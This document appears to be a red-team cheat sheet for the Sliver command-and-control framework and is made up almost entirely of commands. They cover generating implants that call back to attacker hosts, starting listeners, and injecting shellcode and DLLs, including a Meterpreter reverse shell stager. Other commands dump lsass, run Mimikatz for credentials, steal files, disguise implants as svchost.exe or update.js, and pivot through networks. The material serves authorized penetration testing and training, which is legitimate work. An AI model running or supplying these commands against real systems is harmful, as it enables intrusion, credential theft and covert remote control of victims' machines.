---
name: Sliver
category: Exploitation
description: Open-source C2 framework by BishopFox — implant generation, beacons, sessions, pivoting and post-exploitation.
tags: [RTFM]
---

# Sliver

Sliver is an open-source, cross-platform adversary emulation and red team C2 framework by BishopFox. Supports mutual TLS, WireGuard, HTTP(S) and DNS for C2 communication. Written in Go — implants are compiled as native binaries with no runtime dependencies.

## Installation

```bash
# One-liner install (Linux/macOS)
curl https://sliver.sh/install | sudo bash

# Start the server
sliver-server

# Start the client (multiplayer mode)
sliver-server daemon       # run server as daemon
sliver                      # connect as operator
```

## Implant Generation

```bash
# Generate a session implant (interactive)
generate --mtls 10.10.14.5 --os windows --arch amd64 --save /tmp/implant.exe

# Generate a beacon implant (async, periodic callbacks)
generate beacon --mtls 10.10.14.5 --os windows --save /tmp/beacon.exe

# HTTP/HTTPS implant
generate --http 10.10.14.5 --save /tmp/implant.exe

# DNS implant
generate --dns attacker.com --save /tmp/implant.exe

# WireGuard implant
generate --wg 10.10.14.5 --save /tmp/implant.exe

# Linux implant
generate --mtls 10.10.14.5 --os linux --save /tmp/implant

# macOS implant
generate --mtls 10.10.14.5 --os darwin --save /tmp/implant

# Shellcode output
generate --mtls 10.10.14.5 --os windows --format shellcode --save /tmp/implant.bin

# Shared library (DLL/SO)
generate --mtls 10.10.14.5 --os windows --format shared --save /tmp/implant.dll

# Service executable (Windows)
generate --mtls 10.10.14.5 --os windows --format service --save /tmp/svc.exe
```

## Implant Options

```bash
# Obfuscation — symbol obfuscation (enabled by default)
generate --mtls 10.10.14.5 --skip-symbols    # disable for faster builds

# Debug implant
generate --mtls 10.10.14.5 --debug

# Set beacon callback interval
generate beacon --mtls 10.10.14.5 --seconds 30 --jitter 3

# Limit number of reconnect attempts
generate --mtls 10.10.14.5 --max-errors 5

# Evasion — customize process name
generate --mtls 10.10.14.5 --name svchost.exe

# Canary domains (detect leaked implants)
generate --mtls 10.10.14.5 --canary canary.attacker.com

# List generated implants
implants
```

## Listeners

```bash
# Start mTLS listener
mtls --lhost 0.0.0.0 --lport 8888

# Start HTTPS listener
https --lhost 0.0.0.0 --lport 443 --domain attacker.com

# Start HTTP listener
http --lhost 0.0.0.0 --lport 80

# Start DNS listener
dns --domains attacker.com

# Start WireGuard listener
wg --lhost 0.0.0.0 --lport 53

# List active listeners (jobs)
jobs

# Kill a listener
jobs -k <job-id>
```

## Session Management

```bash
# List active sessions and beacons
sessions
beacons

# Interact with a session
use <session-id>

# Interact with a beacon
use <beacon-id>

# Background current session
background

# Kill a session
sessions -k <session-id>

# Kill a beacon
beacons -k <beacon-id>

# Rename a session
rename -n "DC01"

# Session info
info
```

## Post-Exploitation — File Operations

```bash
# Download a file
download C:\\Users\\admin\\Desktop\\secrets.txt /tmp/loot/

# Upload a file
upload /tmp/tool.exe C:\\Windows\\Temp\\tool.exe

# List files
ls C:\\Users\\admin\\Desktop

# Change directory
cd C:\\Users\\admin

# Print working directory
pwd

# Create directory
mkdir C:\\Windows\\Temp\\work

# Remove file
rm C:\\Windows\\Temp\\tool.exe
```

## Post-Exploitation — Execution

```bash
# Execute a command
execute -o cmd.exe /c whoami

# Shell (interactive, drops to OS shell)
shell

# Execute assembly (.NET) in-memory
execute-assembly /tmp/Seatbelt.exe -group=all

# Sideload a DLL
sideload /tmp/payload.dll entryPoint

# Spawn a new process with DLL injection
spawndll /tmp/payload.dll

# Execute shellcode in-memory
execute-shellcode /tmp/shellcode.bin

# Inline shellcode into a running process
execute-shellcode -p <pid> /tmp/shellcode.bin

# MSF stager — generate and inject a Metasploit stager
msf-inject --lhost 10.10.14.5 --lport 4444 --payload windows/x64/meterpreter/reverse_tcp
```

## Post-Exploitation — Reconnaissance

```bash
# Current user
whoami

# Process list
ps

# Network interfaces
ifconfig

# Network connections
netstat

# Environment variables
env

# Registry read (Windows)
registry read "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" ProductName

# Screenshot
screenshot
```

## Privilege Escalation

```bash
# Attempt to get SYSTEM (Windows)
getprivs

# Impersonate user token
impersonate <username>

# Make token from credentials
make-token -u admin -p Password123 -d DOMAIN

# Revert to original token
rev2self

# Run as another user
runas -u admin -p Password123 -d DOMAIN cmd.exe /c whoami
```

## Credential Access

```bash
# Dump process memory (e.g. lsass)
procdump -p <lsass-pid> -s /tmp/lsass.dmp

# Mimikatz integration (Windows, inline)
execute-assembly /tmp/mimikatz.exe "sekurlsa::logonpasswords" "exit"
```

## Pivoting

```bash
# SOCKS5 proxy through implant
socks5 start --port 1080

# Stop SOCKS proxy
socks5 stop --id <id>

# Port forward — local to remote
portfwd add --bind 127.0.0.1:8080 --remote 172.16.0.10:80

# Remove port forward
portfwd rm --id <id>

# List port forwards
portfwd
```

## Stagers & Profiles

```bash
# Generate a stager (small loader that pulls the full implant)
generate stager --lhost 10.10.14.5 --lport 443 --protocol https

# Create a C2 profile (customizes traffic patterns)
https --lhost 0.0.0.0 --lport 443 --website blog

# Host a file on HTTP(S) listener
websites add-content --website blog --web-path /update.js --content /tmp/implant.js
```

## Multiplayer Mode

```bash
# Generate operator config (on server)
new-operator --name red1 --lhost 10.10.14.5 --save /tmp/red1.cfg

# Import config (on client)
import /tmp/red1.cfg

# List operators
operators
```

## Armory (Extensions)

```bash
# List available extensions
armory

# Install an extension
armory install rubeus
armory install seatbelt
armory install sharp-hound-4

# Use installed extension
rubeus kerberoast
seatbelt -- -group=all
```

## Useful Aliases

```bash
# Check implant health
ping

# Reconfigure beacon interval
reconfig --reconnect-interval 60

# List installed extensions
extensions list
```
